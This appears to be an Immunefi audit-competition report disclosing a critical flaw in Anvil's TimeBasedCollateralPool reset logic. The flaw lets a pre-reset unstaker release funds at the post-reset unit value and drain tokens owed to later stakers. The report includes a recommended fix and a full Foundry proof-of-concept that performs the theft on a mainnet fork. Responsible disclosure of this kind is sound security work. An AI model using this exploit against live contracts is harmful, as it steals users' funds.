# #36554 \[SC-Critical] Time Based Collateral Pool Users can release more than their due share of the p

**Submitted on Nov 5th 2024 at 20:54:50 UTC by @niroh for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36554
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://etherscan.io/address/0xd042C267758eDDf34B481E1F539d637e41db3e5a>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When TBCP users have a vested pending unstake at epoc X and epoc X unstakes had already been handled on the contract level, these users can release their stake from the epoc unstake ExitBalance, based on their pending units share of the total units.

If, however, the pool was resetted before that epoc unstake was processed by the pool, the unstake is purged, and the users get their due share based on their totalUnits and out of the reset ExitBalance . This is explained as case a. in the following comment from the code (TimeBasedCollateralPool.sol line 949):

\`\`\`solidity // 2. Process and purge all account pending unstake state. There are two possibilities: // a. A pending unstake is vested or unvested but no vested contract unstake was processed prior to pool // reset. That contract state was purged in \_resetPool(...), the account pool units still exist in the // vault, and we can release them via the standard "everything has been unstaked" logic below. // b. A pending unstake, was vested and the contract unstake was already processed at the time of pool reset. // In this case, the exchange rate was captured in tokenEpochExitBalances, and it's unsafe to process // this unstake any different than the standard release process. \`\`\`

## Vulnerability Details

A bug in the TBCP reset logic enables users who unstake based on a low/dilluted unit value just before a pool reset, to release their share based on the post-reset new unit value (which is likely to be much higher). This enables them to release more than their due share, on the expense of users who entered the pool after the reset. The result is that those users who entered the pool after the reset will not be able to withdraw their due share because of the balance shortfall caused by this exploit. The following scenario details how this can happen:

1. At the start of epoc X, a large claim is made that significantly dilutes the pool unit value.
2. Bob has 1000 units in the pool and he unstakes all his units, expecting a pool reset. (which is likely to happen based on this comment: <https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/TimeBasedCollateralPool.sol#L1115>). The user's firstPendingUnstakeEpoch is set to X+1 with and firstPendingUnstakeUnits set to 1000.
3. The pool is reset, after which new accounts start depositing into the pool. Since the pool was reset, the unit value restarts at 1:1 with the pool token.
4. While still in epoc X, some of the new (post-reset) stakers unstake part of their stakes. their pending-unstake units are recorded under epoc X+1 (both on the users and the contract accounting). Since this happens after the reset, the contract level firstPendingUnstakeEpoch and firstPendingUnstakeUnits have already been reset and start from scratch. However, Bob still has his firstPendingUnstakeEpoch and firstPendingUnstakeUnits set as before (epoc X+1, 1000 units), because they haven't performed any action since the reset.
5. Bob waits until epoc X+2 (when pending unstakes recorded on epoc X+1 can be released), and only at the start of epoc X+2 he calls releaseEligibleTokens to release his 1000 units.
6. Because a reset has happened since Bob's last interaction, the \_resetAccountTokenStateIfApplicable function handles his release.
7. The code below, taken from \_resetAccountTokenStateIfApplicable, is the cause of the problem: (TimeBasedCollateralPool.sol Line 956) \`\`\`solidity uint256 epoch = accountStateStorage.firstPendingUnstakeEpoch; if (epoch > 0) { uint256 currentEpoch = getCurrentEpoch(); if (epoch < currentEpoch) { // NB: This is case b. from above -- do not process contract-level unstakes that have not already been processed. (unstakeUnitsToRelease, \_tokensToRelease) = getAccountExitUnitsAndTokens( \_tokenAddress, epoch, accountStateStorage.firstPendingUnstakeUnits, false ); \`\`\` This code wrongfully assumes that if the resetted user has pending unstakes from an epoc E that is currently vested, then epoc E was either handled on the contract level before the reset (case b), or purged (zeroed) on the contract level and has no ExitBalance. It doesn't take into acount the case where after the reset/purge new funds are deposited and unstaked so that the contract creates a non-empty ExitBalance for epoc E with different units/tokens. In our scenario Bob unstaked before the reset (with a dilluted unit value) but is now able to release their units from the post-reset unstake ExitBalance where their 1000 units grant them much more tokens than their due share. In reality Bob's release action should have been handled as case a (where his total units are taken from the reset ExitBalance).
8. As a result of this error, the user gets significantly more tokens than they deserve. Since all releases are paid from the TBCP available vault balance (which always equals the sum of correct user release amounts), the exccess amount will be taken out of the hands of the real epoc X+1 unstakers, who will revert when they try to release their funds when the TBCP balance reaches zero.

This is brought as a high level explenation of the issue. The attached POC shows a more specific, numeric example.

## Impact Details

Since the perpetrator can withdraw their vault available balance immediately after the release, this vulnerability enables a non-reversible exfiltration of funds that belong to TBCP users, and can not be undone by a pool upgrade. Hence the chosen inpact is critical.

## References

[root cause code](https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/TimeBasedCollateralPool.sol#L956)

## Recommendation

1. Keep a timestamp with every ExitBalance (e.g. add a field to the ExitBalance struct), representing the block.timestamp at which this exit balance was processed by the contract (zero if not processed yet).
2. Also keep a timestamp for every resetNonce (e.g. a mapping of nonce to timestamp) representing the time the Reset corresponding to that nonce was processed.
3. In [\_resetAccountTokenStateIfApplicable line 959](https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/TimeBasedCollateralPool.sol#L959) check if the reset for which the user is currently being resetted happened before or after the user's pending epoc was processed (check for both first and second). If the reset happened before the epoc was processed, go to case a. (process everything from the reset balance).

## Proof of Concept

## Proof of Concept

### run instructions

This test was written in foundry. To run:

1. Install foundry and create a foundry project with \`forge init\`
2. cd to the project folder and install openzeppelin with \`forge install OpenZeppelin/openzeppelin-contracts\` and \`forge install OpenZeppelin/openzeppelin-contracts-upgradeable\`
3. Copy all files from the audit repo \`contracts\` folder to the foundry project \`src\` folder
4. Copy the following folders from the audit repo \`node-modules\` folder to the foundry \`lib\` folder: @pythnetwork, @uniswap
5. Add the following mappings to foundry.toml: remappings = \["@openzeppelin/contracts=lib/openzeppelin-contracts/contracts","@openzeppelin/contracts-upgradable=lib/openzeppelin-contracts-upgradable/contracts","@forge-std=lib/forge-std/src",]
6. Create a test file under the foundry \`test\` folder and copy the code below to it (replace YOUR\_MAINNET\_FORK\_URL with your alchemy/other service url).
7. run \`forge test -vvv --match-test testPostResetDrain\`

### test file code

\`\`\`solidity pragma solidity >=0.8.0;

import {Test} from "@forge-std/Test.sol"; import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol"; import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol"; import {console2} from "@forge-std/console2.sol"; import "./../src/CollateralVault.sol"; import "./../src/TimeBasedCollateralPool.sol"; import "./../src/VisibleBeaconProxy.sol"; import "@openzeppelin/contracts/utils/Strings.sol";

contract TestPostResetDrainUnstake is Test {

```
bytes32 public constant COLLATERALIZABLE_DEPOSIT_APPROVAL_TYPEHASH &#x3D;
    keccak256(
        &quot;CollateralizableDepositApproval(address collateralizableAddress,address tokenAddress,uint256 depositAmount,uint256 approverNonce)&quot;
    );
  address constant USDC &#x3D; 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

CollateralVault public colVault;
UpgradeableBeacon public beacon;
TimeBasedCollateralPool public timedPool;
VisibleBeaconProxy public timedPoolProxy;
TimeBasedCollateralPool public tbcp;
address public defaultClaimDestination;
address public admin;
address public claimant;
address public claimRouter;
address public resetter;
uint256 public startEpoc;

address[] public users;
uint256 public basePriv &#x3D; 0x59c6995e998f97a5a0044970b8655a82b0fca09b555ce282c81d0e3c3f8fbaed;

function setUp() public virtual {

    vm.createSelectFork(YOUR_MAINNET_FORK_URL);


    //initialize addresses
    defaultClaimDestination &#x3D; address(0xaaa);
    admin  &#x3D; address(0xbbb);
    claimant  &#x3D; address(0xccc);
    claimRouter  &#x3D; address(0xddd);
    resetter  &#x3D; address(0xeee);

    //create 300 users (with predictable private keys for signature purposes)
    for (uint i &#x3D; 0;i&lt;3;i++) {
       address usr &#x3D; vm.addr(basePriv+i);   
       users.push(usr);
        deal(address(USDC),usr,10000000e6);
    }
    
    //create config arrays for collateral tokens and colateralizable contracts        
    CollateralVault.CollateralTokenConfig[] memory collateralConfigs &#x3D; new CollateralVault.CollateralTokenConfig[](1);
    CollateralVault.CollateralizableContractApprovalConfig[] memory approvedColables &#x3D; new CollateralVault.CollateralizableContractApprovalConfig[](1);
    

    //initialize tokens
    collateralConfigs[0] &#x3D; CollateralVault.CollateralTokenConfig({
    enabled: true,
    tokenAddress:USDC
    });

    //create a collateral vault
    colVault &#x3D; new CollateralVault(collateralConfigs);

    //create an implementation timedPool
    timedPool &#x3D; new TimeBasedCollateralPool();

    //create a visible beacon
    beacon &#x3D; new UpgradeableBeacon(address(timedPool), address(this));

    //create a beacon proxy pointing to the beacon (initialize?)
    timedPoolProxy &#x3D; new VisibleBeaconProxy(address(beacon), abi.encodeWithSelector(timedPool.initialize.selector,
                                                                                        ICollateral(colVault),
                                                                                        60*60*24*21,
                                                                                        defaultClaimDestination,
                                                                                        admin,
                                                                                        claimant,
                                                                                        claimRouter,
                                                                                        resetter));   

    tbcp &#x3D;    TimeBasedCollateralPool(address(timedPoolProxy));                                                                                             

    //approve the timedPool proxy on the vault
    approvedColables[0] &#x3D; CollateralVault.CollateralizableContractApprovalConfig({
        collateralizableAddress: address(timedPoolProxy),
        isApproved:true
    });
    colVault.upsertCollateralizableContractApprovals(approvedColables); 
    startEpoc &#x3D; tbcp.getCurrentEpoch();                                                                             
}

function testPostResetDrain() public {
      

    //user 0 deposits and stakes 10000USDC. current epoc: 0, user 0 first epoc: 1 (vested at the start of epoc 2)
    poolerDepositAndStake(USDC,10000 * (10 ** 6), basePriv,0);

    //warp 4 days 
    vm.warp(block.timestamp + 4 days);

    
    //claimer claims 99% of claimable (unit diluted). current epoc: 0
    IERC20[] memory tokenss &#x3D; new IERC20[](1);
    tokenss[0] &#x3D; IERC20(USDC);
    uint256[] memory amounts &#x3D; new uint256[](1);
    ITimeBasedCollateralPool.ClaimableCollateral[] memory claimableBals &#x3D; tbcp.getClaimableCollateral(tokenss);
    uint256 claimableNow &#x3D; claimableBals[0].amountClaimableUntilEndOfCurrentEpoch;
    amounts[0] &#x3D; claimableNow * 99 / 100;
    if (amounts[0]&gt;0) {
        vm.prank(claimant);
        tbcp.claim(tokenss,amounts);
    }

    //user 0 unstakes all units. current epoc: 0
    TimeBasedCollateralPool.PoolUnits memory units &#x3D; tbcp.getAccountPoolUnits(users[0],USDC);
    vm.prank(users[0]);
    tbcp.unstake(IERC20(USDC),units.total );

    //warp 5 days
    vm.warp(block.timestamp + 5 days);

    //pool is reset because of share value dilution. current epoc: 0
    vm.prank(resetter);
    tbcp.resetPool(tokenss);    

    //warp 5 days
    vm.warp(block.timestamp + 5 days);

    uint256 user0Balance &#x3D; tbcp.getAccountPoolBalance(users[0],USDC);
    console2.log(&quot;user 0 balance they should be able to withdraw after reset: %s USDC&quot;, user0Balance / (10 ** 6));

    //users 1 and 2 deposit and stake 20000 USDC each. (after reset so units are again 1:1 with usdc) current epoc: 0
    poolerDepositAndStake(USDC,20000 * (10 ** 6), basePriv+1,0);
    poolerDepositAndStake(USDC,20000 * (10 ** 6), basePriv+2,0);

    //warp 3 days
    vm.warp(block.timestamp + 3 days);

    //users 1, 2 unstake 10000 units each. current epoc: 0
     vm.prank(users[1]);
    tbcp.unstake(IERC20(USDC),10000 * (10 ** 6) );
    vm.prank(users[2]);
    tbcp.unstake(IERC20(USDC),10000 * (10 ** 6) );

    //warp to day 50. current epoc: 2 (epoc 1 is now vested)
    vm.warp(block.timestamp + 33 days);

    //user 0 releases eligable tokens. Because of the bug, they get a released amount based on the new unit price, stealing from  
    //users 1 and 2 who deposited and unstaked after the reset, and will now not be able to claim their unstake
    uint256 vaultBalanceBefore &#x3D; colVault.getAccountCollateralBalance(users[0],USDC).available;
    tbcp.releaseEligibleTokens(users[0],tokenss);
    uint256 vaultBalanceAfter &#x3D; colVault.getAccountCollateralBalance(users[0],USDC).available;
    console2.log(&quot;user 0 available vault balance gained: %s USDC&quot;, (vaultBalanceAfter-vaultBalanceBefore) / (10 ** 6));

    uint256 user0USDCbalBefore &#x3D; IERC20(USDC).balanceOf(users[0]);
    uint256 withdrawable &#x3D; colVault.getAccountCollateralBalance(users[0],USDC).available;
    vm.prank(users[0]);
    colVault.withdraw(USDC, withdrawable, users[0]);
    uint256 user0USDCbalAfter &#x3D; IERC20(USDC).balanceOf(users[0]);
    console2.log(&quot;user 0 USDC gained: %s USDC&quot;, (user0USDCbalAfter-user0USDCbalBefore) / (10 ** 6));
    //user 0 withdraws from 9950 USDC from the vault and gets away with the money.
    

    tbcp.releaseEligibleTokens(users[1],tokenss);

    //User 2 releaseEligibleTokens reverts because not enough TBCP available funds remain
    //in collateralVault to cover their unstake (due to the funds stolen by user 0).
    vm.expectRevert();
    tbcp.releaseEligibleTokens(users[2],tokenss);
}

function poolerDepositAndStake(address token, uint256 amount, uint256 privKey, uint256 nonce) internal {
    address pooler &#x3D; vm.addr(privKey);
    vm.startPrank(pooler);
    IERC20(token).approve(address(colVault), amount);
    bytes memory sig &#x3D; signApproval(address(timedPoolProxy), token, amount, nonce,privKey);
    TimeBasedCollateralPool(address(timedPoolProxy)).depositAndStake(IERC20(token),amount,sig);
    vm.stopPrank();
}

function signApproval(address approvedCont, address approvedToken, uint256 amount, uint256 nonce, uint256 privKey) internal returns (bytes memory signature) {
    bytes32 structHash &#x3D; 
        keccak256(
            abi.encode(
                COLLATERALIZABLE_DEPOSIT_APPROVAL_TYPEHASH,
                approvedCont,
                approvedToken,
                amount,
                nonce
            )
        );
    bytes32  EIP712_DOMAIN_TYPEHASH &#x3D; keccak256(&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;);
    bytes32 DOMAIN_SEPARATOR &#x3D; keccak256(
        abi.encode(
            EIP712_DOMAIN_TYPEHASH,
            keccak256(&quot;CollateralVault&quot;),
            keccak256(&quot;1&quot;),
            1,
            address(colVault)
        )
    );

    bytes32 digest &#x3D; keccak256(
        abi.encodePacked(
            &quot;\x19\x01&quot;,
            DOMAIN_SEPARATOR,
            structHash
        )
    );

    (uint8 v, bytes32 r, bytes32 s) &#x3D; vm.sign(privKey, digest);
    signature &#x3D; abi.encodePacked(r, s, v);
}
```

} \`\`\`
